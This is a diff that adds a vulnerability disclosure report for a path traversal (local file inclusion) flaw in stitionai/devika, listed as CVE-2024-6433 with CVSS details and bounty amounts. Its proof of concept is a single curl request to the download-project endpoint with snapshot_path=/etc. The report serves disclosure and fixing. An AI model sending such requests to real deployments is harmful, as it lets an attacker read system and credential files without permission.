@@ -1,0 +1,27 @@
+Title: Local File Inclusion in stitionai/devika
+
+Proof of Concept: 
+Install and launch the application
+run this command : curl http://localhost:1337/api/download-project?snapshot_path=/etc
+
+Impact: 
+files on the system can be read by the attacker
+
+CVE ID: CVE-2024-6433
+Status: (published)
+Vulnerability Type: CWE-23: Relative Path Traversal
+Severity: High (7.5)
+Attack Vector: Network
+Attack Complexity: Low
+Privileges Required: None
+User Interaction: None
+Scope: Unchanged
+Confidentiality: High
+Integrity: None
+Availability: None
+Registry: Pypi
+Affected Version: latest
+Visibility: Public
+Status: Awaiting fix
+Disclosure Bounty: $450
+Fix Bounty: $112.5
